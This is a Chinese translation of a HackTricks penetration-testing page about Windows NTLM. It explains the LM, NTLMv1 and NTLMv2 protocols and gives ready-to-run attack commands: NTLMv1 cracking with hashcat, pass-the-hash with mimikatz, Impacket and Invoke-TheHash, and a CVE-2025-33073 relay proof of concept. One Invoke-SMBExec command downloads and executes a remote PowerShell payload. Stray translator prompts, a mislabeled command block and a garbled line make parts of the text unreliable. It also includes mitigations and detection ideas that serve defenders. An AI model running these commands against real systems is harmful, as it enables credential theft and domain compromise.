# NTLM

{{#include ../../banners/hacktricks-training.md}}


## 基本信息

在运行 **Windows XP 和 Server 2003** 的环境中，会使用 LM（Lan Manager）hash，尽管众所周知，这些 hash 很容易被破解。特定的 LM hash `AAD3B435B51404EEAAD3B435B51404EE` 表示未使用 LM，对应空字符串的 hash。

默认情况下，**Kerberos** authentication protocol 是主要使用的方法。NTLM（NT LAN Manager）会在特定情况下介入：不存在 Active Directory、域不存在、Kerberos 因配置不当而发生故障，或者使用 IP address 而不是有效 hostname 尝试建立连接时。

网络数据包中出现 **"NTLMSSP"** header，表示正在进行 NTLM authentication。

对 LM、NTLMv1 和 NTLMv2 authentication protocols 的支持由位于 `%windir%\Windows\System32\msv1\_0.dll` 的特定 DLL 提供。

**要点**：

- LM hash 存在漏洞，空 LM hash（`AAD3B435B51404EEAAD3B435B51404EE`）表示未使用 LM。
- Kerberos 是默认 authentication method，NTLM 仅在特定条件下使用。
- NTLM authentication 数据包可通过 "NTLMSSP" header 识别。
- LM、NTLMv1 和 NTLMv2 protocols 由系统文件 `msv1\_0.dll` 支持。

## LM、NTLMv1 和 NTLMv2

你可以检查并配置将使用哪种 protocol：

### GUI

执行 _secpol.msc_ -> 本地策略 -> 安全选项 -> 网络安全：LAN Manager authentication level。共有 6 个级别（从 0 到 5）。

![LM、NTLMv1 和 NTLMv2 - GUI：执行 secpol.msc - 本地策略 - 安全选项 - 网络安全：LAN Manager authentication level。共有 6 个级别（从 0 到 5）](<../../images/image (919).png>)

### Registry

这将设置级别 5：
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
可能的值：
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## 基本 NTLM 域 authentication Scheme

1. **用户**输入其**凭据**
2. 客户端计算机发送**authentication request**，其中包含**域名**和**用户名**
3. 服务器发送**challenge**
4. 客户端使用密码的 hash 作为密钥对**challenge 进行加密**，并将其作为 response 发送
5. 服务器向**域控制器**发送**域名、用户名、challenge 和 response**。如果**未配置** Active Directory，或域名就是服务器名称，则会在本地**检查凭据**。
6. **域控制器检查所有信息是否正确**，并将信息发送给服务器

**服务器**和**域控制器**能够通过 **Netlogon** server 创建 **Secure Channel**，因为域控制器知道服务器的密码（该密码位于 **NTDS.DIT** db 中）。

### Local NTLM authentication Scheme

该 authentication 与**前面提到的相同，但是**服务器在 **SAM** 文件中知道尝试进行 authentication 的**用户的 hash**。因此，服务器不会向域控制器发起请求，而是会**自行检查**该用户是否可以进行 authentication。

### NTLMv1 Challenge

**challenge 长度为 8 bytes**，**response 长度为 24 bytes**。

**NT hash（16bytes）** 被分为 **3 个各 7bytes 的部分**（7B + 7B + (2B+0x00\*5)）：**最后一部分始终使用零填充**。然后，使用每个部分分别对 **challenge** 进行**cipher**，并将**得到的 ciphered bytes** 拼接起来。总计：8B + 8B + 8B = 24Bytes。

**问题**：

- 缺乏**随机性**
- 这 3 个部分可以被**分别攻击**，以找出 NT hash
- **DES 可以被破解**
- 第 3 个 key 始终由 **5 个零**组成。
- 给定**相同的 challenge**，**response** 将始终相同。因此，你可以将字符串 "**1122334455667788**" 作为**challenge**发送给受害者，然后使用预先计算的 rainbow tables 攻击所使用的 response。

### NTLMv1 attack

如今，配置了 Unconstrained Delegation 的环境越来越少见，但这并不意味着你无法**滥用已配置的 Print Spooler service**。

你可以滥用 AD 中已有的某些凭据/session，**要求打印机向你控制的某个 host 进行 authentication**。然后，使用 `metasploit auxiliary/server/capture/smb` 或 `responder`，你可以**将 authentication challenge 设置为 1122334455667788**，捕获 authentication 尝试；如果使用的是 **NTLMv1**，你就能够**破解它**。\
如果你使用 `responder`，可以尝试使用**标志 `--lm`**，尝试**降级** authentication。\
_请注意，对于此技术，authentication 必须使用 NTLMv1 执行（NTLMv2 无效）。_

请记住，打印机将在 authentication 期间使用计算机账户，而计算机账户使用的是**长且随机的密码**，你**可能无法**使用常见的**字典**将其破解。但是，**NTLMv1** authentication **使用 DES**（[此处有更多信息](#ntlmv1-challenge)），因此，使用专门用于破解 DES 的服务，你将能够破解它（例如可以使用 [https://crack.sh/](https://crack.sh) 或 [https://ntlmv1.com/](https://ntlmv1.com)）。

### 使用 hashcat 进行 NTLMv1 attack

NTLMv1 也可以使用 NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) 进行破解；该工具会以一种可以使用 hashcat 破解的方式格式化 NTLMv1 messages。<sup>[[1]](#references)</sup>

该命令
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
请提供需要翻译的 Markdown 内容。
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the file name and its contents.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
运行 hashcat（最好通过 hashtopolis 等工具进行分布式处理），否则可能需要数天。
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
在这种情况下，我们知道其密码是 password，因此为了演示目的，我们要作弊：
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
现在需要使用 hashcat-utilities 将已破解的 des 密钥转换为 NTLM hash 的组成部分：
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
请提供需要翻译的最后一部分内容。
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Please provide the English text to translate.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**challenge length is 8 bytes**，并且会发送 **2 个 responses**：其中一个长度为 **24 bytes**，另一个的长度是**可变的**。

**第一个 response** 是通过使用 **HMAC_MD5** 对由 **client 和 domain** 组成的**字符串**进行加密生成的，并使用 **NT hash** 的 **MD4 hash** 作为 **key**。然后，结果将作为 **key**，使用 **HMAC_MD5** 对 **challenge** 进行加密。之后会添加一个 8 bytes 的 **client challenge**。总计：24 B。

**第二个 response** 使用多个值生成（一个新的 client challenge、用于避免 **replay attacks** 的 **timestamp** 等）。

如果你有一个捕获了成功 authentication process 的 **pcap**，可以按照本指南获取 domain、username、challenge 和 response，然后尝试破解 password：[https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)<sup>[[2]](#references)</sup>

## Pass-the-Hash

**一旦你获得了 victim 的 hash**，就可以使用它来**冒充** victim。\
你需要使用一个 **tool** 来**使用该 hash 执行** **NTLM authentication**，**或者**创建一个新的 **sessionlogon**，并将该 **hash** **inject** 到 **LSASS** 中，这样每当执行 **NTLM authentication** 时，都会使用该 **hash**。后一种方式正是 mimikatz 的工作方式。

**请记住，也可以使用 Computer accounts 执行 Pass-the-Hash attacks。**

### **Mimikatz**

**需要以 administrator 身份运行**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
这将启动一个进程，该进程将属于启动 mimikatz 的用户，但在 LSASS 内部，保存的凭据是 mimikatz 参数中提供的凭据。随后，你可以像该用户一样访问网络资源（类似于 `runas /netonly` 技巧，但不需要知道明文密码）。

### Pass-the-Hash from Linux

你可以从 Linux 使用 Pass-the-Hash 在 Windows 机器上获取代码执行权限。\
[**点击此处了解如何操作。**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows 编译工具

你可以[在此处下载 Impacket 的 Windows binaries](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)。

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe**（在此情况下，你需要指定一个命令；cmd.exe 和 powershell.exe 无法用于获取交互式 shell）`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- 还有更多 Impacket binaries...

### Invoke-The-Hash

你可以从此处获取 PowerShell scripts：[https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

此函数是**其他所有函数的组合**。你可以传入**多个 hosts**、**排除**其中一些，并**选择**要使用的**选项**（_SMBExec、WMIExec、SMBClient、SMBEnum_）。如果你选择了 **SMBExec** 或 **WMIExec**，但没有提供任何 _**Command**_ 参数，它只会**检查**你是否拥有**足够的权限**。
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**需要以管理员身份运行**

此工具执行与 mimikatz 相同的操作（修改 LSASS 内存）。
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### 使用用户名和密码手动执行 Windows 远程操作


{{#ref}}
../lateral-movement/
{{#endref}}

## 从 Windows Host 提取凭据

**更多关于** [**如何从 Windows host 获取凭据的信息，请阅读此页面**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**。**

## Internal Monologue attack

Internal Monologue Attack 是一种隐蔽的凭据提取技术，允许攻击者从受害者机器中获取 NTLM hashes，**而无需直接与 LSASS 进程交互**。与直接从内存中读取 hashes、且经常被 endpoint security solutions 或 Credential Guard 阻止的 Mimikatz 不同，该攻击通过 **Security Support Provider Interface (SSPI) 调用 NTLM authentication package (MSV1_0)**。攻击者首先**降低 NTLM 设置的安全级别**（例如 LMCompatibilityLevel、NTLMMinClientSec、RestrictSendingNTLMTraffic），确保允许使用 NetNTLMv1。随后，他们模拟从正在运行的进程中获取的现有 user tokens，并在本地触发 NTLM authentication，使用已知 challenge 生成 NetNTLMv1 responses。<sup>[[4]](#references)</sup>

捕获这些 NetNTLMv1 responses 后，攻击者可以使用**预计算的 rainbow tables**快速恢复原始 NTLM hashes，从而进一步通过 Pass-the-Hash attacks 进行 lateral movement。关键在于，Internal Monologue Attack 不会生成 network traffic、注入 code 或触发直接的 memory dumps，因此仍然具有隐蔽性；与 Mimikatz 等传统方法相比，defenders 更难检测到它。

如果由于强制实施的 security policies 而不接受 NetNTLMv1，攻击者可能无法获取 NetNTLMv1 response。

为处理这种情况，Internal Monologue tool 已进行更新：如果 NetNTLMv1 失败，它会通过 `AcceptSecurityContext()` 动态获取 server token，以继续**捕获 NetNTLMv2 responses**。虽然 NetNTLMv2 的 crack 难度高得多，但在有限情况下，它仍然为 relay attacks 或 offline brute-force 提供了路径。

PoC 可以在 **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)** 中找到。

## NTLM Relay and Responder

**有关如何执行这些 attacks 的更详细指南，请阅读此处：**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## 从 network capture 中解析 NTLM challenges

**你可以使用** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM & Kerberos *Reflection* via Serialized SPNs (CVE-2025-33073)

Windows 包含多项用于阻止 *reflection* attacks 的 mitigations，这类 attacks 会将源自某个 host 的 NTLM（或 Kerberos）authentication relay 回**同一个** host，以获取 SYSTEM privileges。

Microsoft 通过 MS08-068（SMB→SMB）、MS09-013（HTTP→SMB）、MS15-076（DCOM→DCOM）及后续 patches 修复了大多数 public chains，但 **CVE-2025-33073** 表明，通过滥用 **SMB client 截断包含 *marshalled*（serialized）target-info 的 Service Principal Names (SPNs)**，仍然可以绕过这些 protections。<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR of the bug
1. 攻击者注册一个 **DNS A-record**，其 label 编码了一个 marshalled SPN，例如：
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. 通过 PetitPotam、DFSCoerce 等方式，诱使 victim 向该 hostname 进行 authentication。
3. 当 SMB client 将 target string `cifs/srv11UWhRCAAAAA…` 传递给 `lsasrv!LsapCheckMarshalledTargetInfo` 时，对 `CredUnmarshalTargetInfo` 的调用会**移除** serialized blob，仅留下 **`cifs/srv1`**。
4. `msv1_0!SspIsTargetLocalhost`（或对应的 Kerberos 函数）现在会将 target 视为 *localhost*，因为 short host part 与 computer name（`SRV1`）匹配。
5. 因此，server 设置 `NTLMSSP_NEGOTIATE_LOCAL_CALL`，并将 **LSASS 的 SYSTEM access-token** 注入 context（对于 Kerberos，则会创建一个标记为 SYSTEM 的 subsession key）。
6. 使用 `ntlmrelayx.py` **或** `krbrelayx.py` relay 该 authentication，即可在同一 host 上获得完整的 SYSTEM rights。<sup>[[5]](#references)</sup>

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### 修补与缓解措施
* 针对 **CVE-2025-33073** 的 KB patch 在 `mrxsmb.sys::SmbCeCreateSrvCall` 中加入检查：阻止目标包含 marshalled info（`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`）的任何 SMB connection。<sup>[[5]](#references)[[6]](#references)</sup>
* 强制启用 **SMB signing**，即使在未修补主机上也能防止 reflection。
* 监控类似 `*<base64>...*` 的 DNS records，并阻止 coercion vectors（PetitPotam、DFSCoerce、AuthIP...）。

### Detection ideas
* 捕获包含 `NTLMSSP_NEGOTIATE_LOCAL_CALL` 的 network 流量，其中 client IP ≠ server IP。
* Kerberos AP-REQ 包含 subsession key，且 client principal 等于 hostname。
* Windows Event 4624/4648 SYSTEM logon 后，紧接着从同一主机发起 remote SMB writes。<sup>[[5]](#references)</sup>

对于 **March 2026** 的 local reflection variant（滥用 **SMB arbitrary ports** 和 **TCP connection reuse** 以获取 `NT AUTHORITY\SYSTEM`），请参阅：

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [破解 NTLMv2 Hash](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack：在不接触 LSASS 的情况下获取 NTLM Hash](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection 已死，NTLM Reflection 万岁！](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
